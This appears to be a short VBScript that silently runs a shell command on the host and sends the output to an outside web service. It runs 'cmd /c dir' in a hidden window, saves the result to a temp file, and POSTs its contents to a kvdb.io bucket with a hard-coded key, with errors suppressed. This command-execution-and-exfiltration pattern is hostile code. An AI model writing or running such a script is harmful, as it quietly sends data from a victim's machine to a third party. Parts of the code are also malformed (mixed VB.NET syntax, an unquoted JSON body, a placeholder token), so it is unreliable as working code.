Imports System.Runtime.InteropServices
Dim objXmlHttpMain , URL
Dim res,res_key , upload_ep
Dim objShell
Set objShell = WScript.CreateObject ("WScript.shell")
'objShell.run "cmd /c dir"
'Set objShell = Nothing
return_me = objShell.Run("cmd /c dir > c:\temp\output.txt", 0, true)
Set fso  = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile("c:\temp\output.txt", 1)
text = file.ReadAll
file.Close
'Wscript.Echo return_me
res="2CD41GteLYLuvotryGMN5g"
res_key=res
updated_ep="https://kvdb.io/"&res_key&"/hits"
'var res1=obj.PostRequestJson(updated_ep,file_text);
strJSONToSend = "{""type"": ""note"", ""title"": ""Alert"", ""body"": "&text&"}"
URL="http://192.168.183.202:1234/v2/pushes" 
URL=updated_ep
Set objXmlHttpMain = CreateObject("Msxml2.ServerXMLHTTP") 
on error resume next 
objXmlHttpMain.open "POST",URL, False 
objXmlHttpMain.setRequestHeader "Authorization", "Bearer <api secret id>"
objXmlHttpMain.setRequestHeader "Content-Type", "application/json"


objXmlHttpMain.send strJSONToSend

set objJSONDoc = nothing 
set objResult = nothing
